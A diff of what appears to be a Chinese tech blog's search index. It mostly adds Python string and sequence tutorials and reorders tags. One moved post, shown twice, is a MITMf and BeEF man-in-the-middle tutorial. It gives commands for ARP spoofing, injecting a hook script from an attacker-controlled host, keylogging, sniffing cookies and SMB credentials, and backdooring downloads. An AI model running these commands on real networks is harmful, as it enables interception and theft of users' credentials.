@@ -73,9 +73,9 @@
           
           <category> DBMS </category>
           
-          <category> MongoDB </category>
-          
           <category> Python </category>
+          
+          <category> MongoDB </category>
           
       </categories>
       
@@ -332,9 +332,9 @@
           
           <category> DBMS </category>
           
-          <category> MySQL </category>
-          
           <category> Python </category>
+          
+          <category> MySQL </category>
           
       </categories>
       
@@ -346,6 +346,87 @@
             <tag> mysql </tag>
             
             <tag> pymysql </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Python3中常用的字符串方法</title>
+      <link href="/2018/02/10/Python/Python_Basic/Python3%E4%B8%AD%E5%B8%B8%E7%94%A8%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%96%B9%E6%B3%95/"/>
+      <url>/2018/02/10/Python/Python_Basic/Python3%E4%B8%AD%E5%B8%B8%E7%94%A8%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%96%B9%E6%B3%95/</url>
+      
+        <content type="html"><![CDATA[<ul><li>方法的调用语法:<ul><li>对象.方法名(方法传参)</li></ul></li><li>说明:<ul><li>方法的调用同函数</li></ul></li><li>示例:  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#39;abc&#39;.isalpha()#判断&#39;abc&#39;是否全为英文字母</span><br><span class="line">&#39;123&#39;.isalpha()#False,123没有isalpha方法</span><br></pre></td></tr></table></figure></li></ul><h4 id="常用字符串方法"><a href="#常用字符串方法" class="headerlink" title="常用字符串方法"></a><strong>常用字符串方法</strong></h4><table><thead><tr><th align="center">方法</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">s.isdigit()</td><td align="center">判断字符串中的字符是否全为数字</td></tr><tr><td align="center">s.isalpha()</td><td align="center">判断字符串是否全为英文字母</td></tr><tr><td align="center">s.islower()</td><td align="center">判断字符串所有字符是否全为小写英文字母</td></tr><tr><td align="center">s.isupper()</td><td align="center">判断字符串所有字符是否全为大写英文字母</td></tr><tr><td align="center">s.isspace()</td><td align="center">判断字符串是否全为空白字符</td></tr><tr><td align="center">s.center(width[,fill])</td><td align="center">将原字符串居中,左右默认填充空格</td></tr><tr><td align="center">s.count(sub[,start[,end]])</td><td align="center">获取一个字符串中子串的个数</td></tr><tr><td align="center">s.find(sub[,start[,end]])</td><td align="center">获取字符串中子串sub的索引,失败返回-1</td></tr><tr><td align="center">s.strip()</td><td align="center">返回去掉左右空白字符的字符串</td></tr><tr><td align="center">s.lstrip()</td><td align="center">返回去掉左侧空白字符的字符串</td></tr><tr><td align="center">字符串</td><td align="center"></td></tr><tr><td align="center">s.upper()</td><td align="center">生成将英文转换为大写的字符串</td></tr><tr><td align="center">s.lower()</td><td align="center">生成将英文转换为小写的字符串</td></tr><tr><td align="center">s.replace(old,new[,count])</td><td align="center">将原字符串的old用new代替,生成一个新的字符串</td></tr><tr><td align="center">s.startswith(prefix[,start[,end]])</td><td align="center">返回s是否是以prefix开头,如以prefix开头返回True</td></tr><tr><td align="center">s.endswith(suffix[,start[,end]])</td><td align="center">返回s是否是以suffix结束,如果以suffix结束返回True</td></tr><tr><td align="center">s.format()</td><td align="center">调用此方法的字符串可以包含字符串字面值或者以花括号 <code>{}</code> 括起来的替换域</td></tr><tr><td align="center">不常用的</td><td align="center"></td></tr><tr><td align="center">s.title()</td><td align="center">生成每个英文单词的首字母大写字符串</td></tr><tr><td align="center">s.isnumeric()</td><td align="center">判断字符串是否全为数字字符</td></tr></tbody></table><ul><li><strong>示例</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">'abc'</span>.center(<span class="number">10</span>)</span><br><span class="line"><span class="string">'   abc    '</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">'abc'</span>.center(<span class="number">20</span>,<span class="string">'#'</span>)</span><br><span class="line"><span class="string">'########abc#########'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s=<span class="string">'hello world'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.count(<span class="string">'o'</span>)</span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.count(<span class="string">'o'</span>,<span class="number">1</span>,<span class="number">6</span>)</span><br><span class="line"><span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">"The sum of 1 + 2 is &#123;0&#125;"</span>.format(<span class="number">1</span>+<span class="number">2</span>)</span><br><span class="line"><span class="string">'The sum of 1 + 2 is 3'</span></span><br></pre></td></tr></table></figure></li><li><em>更多方法请参考官方文档*</em> <code>https://docs.python.org/zh-tw/3/library/stdtypes.html#string-methods</code></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> Python </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> python </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Python3中常用的序列函数</title>
+      <link href="/2018/02/10/Python/Python_Basic/Python3%E4%B8%AD%E5%B8%B8%E7%94%A8%E7%9A%84%E5%BA%8F%E5%88%97%E5%87%BD%E6%95%B0/"/>
+      <url>/2018/02/10/Python/Python_Basic/Python3%E4%B8%AD%E5%B8%B8%E7%94%A8%E7%9A%84%E5%BA%8F%E5%88%97%E5%87%BD%E6%95%B0/</url>
+      
+        <content type="html"><![CDATA[<h4 id="序列函数"><a href="#序列函数" class="headerlink" title="序列函数"></a><strong>序列函数</strong></h4><ul><li><p><code>len(seq)</code>        #返回序列长度</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">'python'</span></span><br><span class="line">print(len(s))<span class="comment">#6</span></span><br><span class="line">print(len(<span class="string">"python"</span>))<span class="comment">#6</span></span><br></pre></td></tr></table></figure></li><li><p><code>max(x)</code>            #返回序列的最大值的元素</p></li><li><p><code>min(x)</code>            #返回序列的最小值的元素</p></li></ul><h4 id="字符串编码转换函数"><a href="#字符串编码转换函数" class="headerlink" title="字符串编码转换函数"></a><strong>字符串编码转换函数</strong></h4><ul><li><code>ord(c)</code>    #返回一个字符的Unicode值</li><li><code>chr(i)</code>    #返回i这个值所对应的字符<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">i=ord(<span class="string">'喵'</span>)</span><br><span class="line">print(i)<span class="comment">#21941</span></span><br><span class="line">c=chr(<span class="number">21941</span>)</span><br><span class="line">print(c)<span class="comment">#喵</span></span><br></pre></td></tr></table></figure></li></ul><p><strong>字符串转unicode小程序</strong> <code>str2unicode.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s=input(<span class="string">'请输入一个字符串:'</span>)</span><br><span class="line"><span class="keyword">if</span> s !=<span class="string">''</span>:</span><br><span class="line">print(s[<span class="number">0</span>],<span class="string">"的编码值是:"</span>,ord(s[<span class="number">0</span>]))</span><br></pre></td></tr></table></figure><p><strong>unicode转字符串</strong> <code>nnicode2str</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">code=int(input(<span class="string">"请输入一个整数值(0~65535):"</span>))</span><br><span class="line">print(code,<span class="string">"所对应的字符是:"</span>,chr(code))</span><br></pre></td></tr></table></figure><h4 id="整数转换为字符串函数"><a href="#整数转换为字符串函数" class="headerlink" title="整数转换为字符串函数"></a><strong>整数转换为字符串函数</strong></h4><ul><li><p><code>hex(i)</code>    #将整数转换为十六进制字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; hex(1111)</span><br><span class="line">&#39;0x457&#39;</span><br><span class="line">&gt;&gt;&gt; hex(1000)</span><br><span class="line">&#39;0x3e8&#39;</span><br></pre></td></tr></table></figure></li><li><p><code>oct(i)</code>    #将整数转换为八进制字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; oct(1000)</span><br><span class="line">&#39;0o1750&#39;</span><br><span class="line">&gt;&gt;&gt; oct(1111)</span><br><span class="line">&#39;0o2127&#39;</span><br></pre></td></tr></table></figure></li><li><p><code>bin(i)</code>    #将整数转换为二进制字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; bin(1111)</span><br><span class="line">&#39;0b10001010111&#39;</span><br><span class="line">&gt;&gt;&gt; bin(1000)</span><br><span class="line">&#39;0b1111101000&#39;</span><br></pre></td></tr></table></figure></li></ul><p><strong>字符串构造函数</strong></p><ul><li><code>str(obj=&#39;&#39;)</code>        #将对象转换为字符串<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; str(1000)</span><br><span class="line">&#39;1000&#39;</span><br><span class="line">&gt;&gt;&gt; str(111.11)</span><br><span class="line">&#39;111.11&#39;</span><br></pre></td></tr></table></figure></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> Python </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> python </tag>
+            
+            <tag> 序列函数 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Python字符串的索引和切片</title>
+      <link href="/2018/02/09/Python/Python_Basic/Python%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E7%B4%A2%E5%BC%95%E5%92%8C%E5%88%87%E7%89%87/"/>
+      <url>/2018/02/09/Python/Python_Basic/Python%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E7%B4%A2%E5%BC%95%E5%92%8C%E5%88%87%E7%89%87/</url>
+      
+        <content type="html"><![CDATA[<h4 id="字符串的索引-index"><a href="#字符串的索引-index" class="headerlink" title="字符串的索引 index"></a><strong>字符串的索引</strong> index</h4><ul><li>python的字符串是不可以改变的字符序列</li><li>语法:<ul><li><code>字符串[整数表达式]</code></li></ul></li><li>说明:<ul><li>python序列都可以用索引(index)来访问序列中的对象</li><li>python序列的正向索引是从0开始的,第二个索引为1…,以此类推,最后一个索引是 <code>len(s)-1</code></li><li>python序列的反向索引是从-1开始的,-1代表最后一个,-2代表倒数第二个,以此类推,第一个是 <code>-len(s)</code></li></ul></li><li>示例:<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">"ABCD"</span></span><br><span class="line">print(s[<span class="number">0</span>]) <span class="comment">#A</span></span><br><span class="line">print(s[<span class="number">2</span>])<span class="comment">#C</span></span><br><span class="line">print(s[<span class="number">-1</span>])<span class="comment">#D</span></span><br><span class="line">print(s[<span class="number">-4</span>])<span class="comment">#A</span></span><br><span class="line">print(s[<span class="number">-5</span>])<span class="comment">#报错</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="字符串切片-slice"><a href="#字符串切片-slice" class="headerlink" title="字符串切片 slice"></a><strong>字符串切片</strong> slice</h4><ul><li>从字符串序列中取出相应的元素,重新组成一个字符串序列</li><li>语法:<ul><li><code>字符串[(开始索引b):(结束索引e)(:(步长s))]</code></li><li>注: 小括号()括起的部分代表可以省略<br>语法说明:</li></ul><ol><li>开始索引是切片切下的位置,0代表第一个元素,1代表第二个元素,-1代表最后一个元素</li><li>结束索引是切片的终止索引(但不包含终止点)</li><li>步长是切片每次获取完当前元素后移动的方向和偏移量<ul><li>没有步长,相当于取值完毕后右移动一个索引的位置(默认为1)</li><li>当步长为正数时,最正向切片</li><li>当步长为负数时,取反向切片<ul><li>反向切片时,默认的起始位置为最后一个元素,终止位置是第一个元素的前一个位置</li></ul></li></ul></li></ol></li><li>示例:<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">'ABCDEFGHJKL'</span></span><br><span class="line">print(s[:<span class="number">4</span>])<span class="comment">#ABCD</span></span><br><span class="line">print(s[<span class="number">1</span>:<span class="number">5</span>])<span class="comment">#BCDE</span></span><br><span class="line">print(s[<span class="number">1</span>:<span class="number">-1</span>])<span class="comment">#BCDEFGHJK</span></span><br><span class="line">print(s[<span class="number">-100</span>:<span class="number">100</span>])<span class="comment">#ABCDEFGHJKL</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s[:]</span><br><span class="line"><span class="string">'ABCDEFGHJKL'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s[::]</span><br><span class="line"><span class="string">'ABCDEFGHJKL'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s[::<span class="number">1</span>]<span class="comment">#步长1</span></span><br><span class="line"><span class="string">'ABCDEFGHJKL'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s[::<span class="number">2</span>]<span class="comment">#步长2</span></span><br><span class="line"><span class="string">'ACEGJL'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s[::<span class="number">3</span>]<span class="comment">#步长3</span></span><br><span class="line"><span class="string">'ADGK'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s[::<span class="number">-1</span>]<span class="comment">#反向</span></span><br><span class="line"><span class="string">'LKJHGFEDCBA'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s[:<span class="number">-2</span>:<span class="number">2</span>]</span><br><span class="line"><span class="string">'ACEGJ'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s[<span class="number">-1</span>:<span class="number">0</span>:<span class="number">-1</span>]</span><br><span class="line"><span class="string">'LKJHGFEDCB'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s[:<span class="number">-100</span>:<span class="number">-1</span>]</span><br><span class="line"><span class="string">'LKJHGFEDCBA'</span></span><br></pre></td></tr></table></figure></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> Python </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> python </tag>
+            
+            <tag> 索引 </tag>
+            
+            <tag> 切片 </tag>
             
         </tags>
       
@@ -424,17 +505,17 @@
             
             <tag> 免杀 </tag>
             
-            <tag> backdoor-factory </tag>
-            
-            <tag> msfvenom </tag>
-            
             <tag> MSF </tag>
             
-            <tag> bdfproxy </tag>
+            <tag> msfvenom </tag>
             
             <tag> payload </tag>
             
             <tag> python </tag>
+            
+            <tag> backdoor-factory </tag>
+            
+            <tag> bdfproxy </tag>
             
             <tag> arpspoof </tag>
             
@@ -467,13 +548,13 @@
             
             <tag> msfvenom </tag>
             
+            <tag> Veil-Framework </tag>
+            
             <tag> payload </tag>
             
             <tag> python </tag>
             
             <tag> passing-the-hash </tag>
-            
-            <tag> Veil-Framework </tag>
             
             <tag> shellter </tag>
             
@@ -506,17 +587,17 @@
             
             <tag> 免杀 </tag>
             
-            <tag> msfvenom </tag>
-            
             <tag> MSF </tag>
             
-            <tag> payload </tag>
-            
-            <tag> python </tag>
+            <tag> msfvenom </tag>
             
             <tag> Veil-Framework </tag>
             
             <tag> Hyperion </tag>
+            
+            <tag> payload </tag>
+            
+            <tag> python </tag>
             
             <tag> Veil-evasion </tag>
             
@@ -547,9 +628,9 @@
             
             <tag> 免杀 </tag>
             
-            <tag> msfvenom </tag>
-            
             <tag> MSF </tag>
+            
+            <tag> msfvenom </tag>
             
             <tag> Hyperion </tag>
             
@@ -882,11 +963,11 @@
             
             <tag> MSF </tag>
             
+            <tag> meterpreter </tag>
+            
             <tag> metsvc </tag>
             
             <tag> persistence </tag>
-            
-            <tag> meterpreter </tag>
             
             <tag> 后门持久化 </tag>
             
@@ -919,11 +1000,11 @@
             
             <tag> MSF </tag>
             
-            <tag> meterpreter </tag>
-            
             <tag> dumplinks </tag>
             
             <tag> hosts编辑 </tag>
+            
+            <tag> meterpreter </tag>
             
             <tag> 迁移进程 </tag>
             
@@ -1287,9 +1368,9 @@
             
             <tag> payload </tag>
             
-            <tag> shellcode </tag>
-            
             <tag> ruby </tag>
+            
+            <tag> shellcode </tag>
             
         </tags>
       
@@ -1427,9 +1508,9 @@
             
             <tag> Kali </tag>
             
-            <tag> Metasploit </tag>
-            
             <tag> ruby </tag>
+            
+            <tag> Metasploit </tag>
             
             <tag> postgresql </tag>
             
@@ -2148,9 +2229,9 @@
       
         <tags>
             
-            <tag> 无线数据帧 </tag>
-            
             <tag> 802.11 </tag>
+            
+            <tag> 无线数据帧 </tag>
             
         </tags>
       
@@ -2223,43 +2304,6 @@
     
     
     <entry>
-      <title>Mitmf中间人攻击结合beef框架XSS攻击</title>
-      <link href="/2015/05/26/Password_Attacks/%E7%BD%91%E7%BB%9C%E5%AF%86%E7%A0%81%E6%8A%93%E5%8C%85%E5%97%85%E6%8E%A2%E5%8F%8A%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"/>
-      <url>/2015/05/26/Password_Attacks/%E7%BD%91%E7%BB%9C%E5%AF%86%E7%A0%81%E6%8A%93%E5%8C%85%E5%97%85%E6%8E%A2%E5%8F%8A%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/</url>
-      
-        <content type="html"><![CDATA[<blockquote><h3 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a><strong>中间人攻击</strong></h3></blockquote><h4 id="注入XSS"><a href="#注入XSS" class="headerlink" title="注入XSS"></a><strong>注入XSS</strong></h4><ul><li>即使没有XSS漏洞，也可以凌空向每个HTTP请求中注入XSS攻击代码</li><li>一旦得手，影响范围巨大</li><li>如果中间人发生在运营商线路上，很难引起用户注意</li></ul><h4 id="Mitmf-安装"><a href="#Mitmf-安装" class="headerlink" title="Mitmf 安装"></a><strong>Mitmf</strong> 安装</h4><ul><li>曾经号称最好用的中间人攻击工具(kali 2.0后默认未安装)<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">apt-get install python-dev python-setuptools libpcap0.8-dev libnetfilterqueue-dev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev libcapstone3 libcapstone-dev libffi-dev file</span><br><span class="line">apt-get install mitmf</span><br><span class="line">pip uninstall twisted</span><br><span class="line">wget http:&#x2F;&#x2F;twistedmatrix.com&#x2F;Releases&#x2F;Twisted&#x2F;15.5&#x2F;Twisted15.5.0.tar.bz2</span><br><span class="line">pip install .&#x2F;Twisted-15.5.0.tar.bz2</span><br></pre></td></tr></table></figure></li><li>启动beef<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;share&#x2F;beef-xss&#x2F;</span><br><span class="line">.&#x2F;beef</span><br><span class="line">&#96;&#96;&#96;</span><br><span class="line">* mitmf中间人注入xss脚本</span><br><span class="line">&#96;&#96;&#96;</span><br><span class="line">mitmf --spoof --arp -i eth0 --gateway 1.1.1.1 --target 1.1.1.2 --inject --js-url http:&#x2F;&#x2F;1.1.1.3:3000&#x2F;hook.js</span><br><span class="line">mitmf --spoof --arp -i eth0 --gateway 192.168.20.2 --target 192.168.20.1 --jskeylogger</span><br><span class="line"></span><br><span class="line">--upsidedownternet、--screen(&#x2F;var&#x2F;log&#x2F;mitmf)#颠倒图片及屏幕快照</span><br><span class="line">--ferretng（cookie）、--browserprofiler(浏览器及插件信息)#嗅探cookie及浏览器插件信息</span><br><span class="line">--smbtrap、--smbauth#smb身份认证信息嗅探</span><br><span class="line"></span><br><span class="line">--hsts#协议降级攻击</span><br><span class="line">HTTP Strict Transport Security</span><br><span class="line">防止协议降级、cookie窃取</span><br><span class="line">安全策略通过HTTP响应头”Strict-Transport-Security“实施</span><br><span class="line">限制user-agent、https等</span><br><span class="line"></span><br><span class="line">--filepwn </span><br><span class="line">凌空插后门,传输过程中插入后门</span><br></pre></td></tr></table></figure></li></ul>]]></content>
-      
-      
-      <categories>
-          
-          <category> 渗透测试 </category>
-          
-          <category> 密码攻击 </category>
-          
-          <category> 嗅探欺骗 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> arpspoof </tag>
-            
-            <tag> dnsspoof </tag>
-            
-            <tag> Mitmf </tag>
-            
-            <tag> XSS </tag>
-            
-            <tag> beef </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>Ettercap中间人攻击</title>
       <link href="/2015/05/26/Password_Attacks/Ettercap%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"/>
       <url>/2015/05/26/Password_Attacks/Ettercap%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/</url>
@@ -2289,6 +2333,43 @@
             <tag> PTH </tag>
             
             <tag> 中间人攻击 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Mitmf中间人攻击结合beef框架XSS攻击</title>
+      <link href="/2015/05/26/Password_Attacks/%E7%BD%91%E7%BB%9C%E5%AF%86%E7%A0%81%E6%8A%93%E5%8C%85%E5%97%85%E6%8E%A2%E5%8F%8A%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"/>
+      <url>/2015/05/26/Password_Attacks/%E7%BD%91%E7%BB%9C%E5%AF%86%E7%A0%81%E6%8A%93%E5%8C%85%E5%97%85%E6%8E%A2%E5%8F%8A%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/</url>
+      
+        <content type="html"><![CDATA[<blockquote><h3 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a><strong>中间人攻击</strong></h3></blockquote><h4 id="注入XSS"><a href="#注入XSS" class="headerlink" title="注入XSS"></a><strong>注入XSS</strong></h4><ul><li>即使没有XSS漏洞，也可以凌空向每个HTTP请求中注入XSS攻击代码</li><li>一旦得手，影响范围巨大</li><li>如果中间人发生在运营商线路上，很难引起用户注意</li></ul><h4 id="Mitmf-安装"><a href="#Mitmf-安装" class="headerlink" title="Mitmf 安装"></a><strong>Mitmf</strong> 安装</h4><ul><li>曾经号称最好用的中间人攻击工具(kali 2.0后默认未安装)<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">apt-get install python-dev python-setuptools libpcap0.8-dev libnetfilterqueue-dev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev libcapstone3 libcapstone-dev libffi-dev file</span><br><span class="line">apt-get install mitmf</span><br><span class="line">pip uninstall twisted</span><br><span class="line">wget http:&#x2F;&#x2F;twistedmatrix.com&#x2F;Releases&#x2F;Twisted&#x2F;15.5&#x2F;Twisted15.5.0.tar.bz2</span><br><span class="line">pip install .&#x2F;Twisted-15.5.0.tar.bz2</span><br></pre></td></tr></table></figure></li><li>启动beef<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;share&#x2F;beef-xss&#x2F;</span><br><span class="line">.&#x2F;beef</span><br><span class="line">&#96;&#96;&#96;</span><br><span class="line">* mitmf中间人注入xss脚本</span><br><span class="line">&#96;&#96;&#96;</span><br><span class="line">mitmf --spoof --arp -i eth0 --gateway 1.1.1.1 --target 1.1.1.2 --inject --js-url http:&#x2F;&#x2F;1.1.1.3:3000&#x2F;hook.js</span><br><span class="line">mitmf --spoof --arp -i eth0 --gateway 192.168.20.2 --target 192.168.20.1 --jskeylogger</span><br><span class="line"></span><br><span class="line">--upsidedownternet、--screen(&#x2F;var&#x2F;log&#x2F;mitmf)#颠倒图片及屏幕快照</span><br><span class="line">--ferretng（cookie）、--browserprofiler(浏览器及插件信息)#嗅探cookie及浏览器插件信息</span><br><span class="line">--smbtrap、--smbauth#smb身份认证信息嗅探</span><br><span class="line"></span><br><span class="line">--hsts#协议降级攻击</span><br><span class="line">HTTP Strict Transport Security</span><br><span class="line">防止协议降级、cookie窃取</span><br><span class="line">安全策略通过HTTP响应头”Strict-Transport-Security“实施</span><br><span class="line">限制user-agent、https等</span><br><span class="line"></span><br><span class="line">--filepwn </span><br><span class="line">凌空插后门,传输过程中插入后门</span><br></pre></td></tr></table></figure></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透测试 </category>
+          
+          <category> 密码攻击 </category>
+          
+          <category> 嗅探欺骗 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> arpspoof </tag>
+            
+            <tag> Mitmf </tag>
+            
+            <tag> XSS </tag>
+            
+            <tag> dnsspoof </tag>
+            
+            <tag> beef </tag>
             
         </tags>
       
@@ -2352,9 +2433,9 @@
             
             <tag> dsniff </tag>
             
-            <tag> driftnet </tag>
-            
             <tag> dnsspoof </tag>
+            
+            <tag> driftnet </tag>
             
         </tags>
       
@@ -2449,15 +2530,15 @@
       
         <tags>
             
-            <tag> 离线密码破解 </tag>
+            <tag> Linux密码破解 </tag>
             
-            <tag> John </tag>
+            <tag> 离线密码破解 </tag>
             
             <tag> 彩虹表 </tag>
             
-            <tag> Ophcrack </tag>
+            <tag> John </tag>
             
-            <tag> Linux密码破解 </tag>
+            <tag> Ophcrack </tag>
             
             <tag> Windows密码 </tag>
             
@@ -2659,11 +2740,11 @@
       
         <tags>
             
-            <tag> Linux密码破解 </tag>
-            
             <tag> hydra </tag>
             
             <tag> 在线密码破解 </tag>
+            
+            <tag> Linux密码破解 </tag>
             
         </tags>
       
@@ -3072,9 +3153,9 @@
       
         <tags>
             
-            <tag> DoS攻击 </tag>
-            
             <tag> 拒绝服务攻击 </tag>
+            
+            <tag> DoS攻击 </tag>
             
             <tag> ARP欺骗 </tag>
             
@@ -3555,9 +3636,9 @@
       
         <tags>
             
-            <tag> DoS攻击 </tag>
-            
             <tag> 拒绝服务攻击 </tag>
+            
+            <tag> DoS攻击 </tag>
             
             <tag> 入侵检测 </tag>
             
@@ -3631,9 +3712,9 @@
             
             <tag> python </tag>
             
-            <tag> DoS攻击 </tag>
-            
             <tag> 拒绝服务攻击 </tag>
+            
+            <tag> DoS攻击 </tag>
             
             <tag> 缓冲区溢出 </tag>
             
@@ -3736,11 +3817,11 @@
       
         <tags>
             
-            <tag> 拒绝服务攻击 </tag>
-            
             <tag> DNS </tag>
             
             <tag> dig </tag>
+            
+            <tag> 拒绝服务攻击 </tag>
             
             <tag> scapy </tag>
             
@@ -3771,9 +3852,9 @@
             
             <tag> python </tag>
             
-            <tag> DoS攻击 </tag>
-            
             <tag> 拒绝服务攻击 </tag>
+            
+            <tag> DoS攻击 </tag>
             
             <tag> teardrop </tag>
             
@@ -3804,13 +3885,13 @@
             
             <tag> python </tag>
             
-            <tag> C </tag>
-            
-            <tag> DoS攻击 </tag>
-            
             <tag> 拒绝服务攻击 </tag>
             
             <tag> scapy </tag>
+            
+            <tag> C </tag>
+            
+            <tag> DoS攻击 </tag>
             
             <tag> Smurf </tag>
             
@@ -3845,11 +3926,11 @@
             
             <tag> python </tag>
             
-            <tag> DoS攻击 </tag>
-            
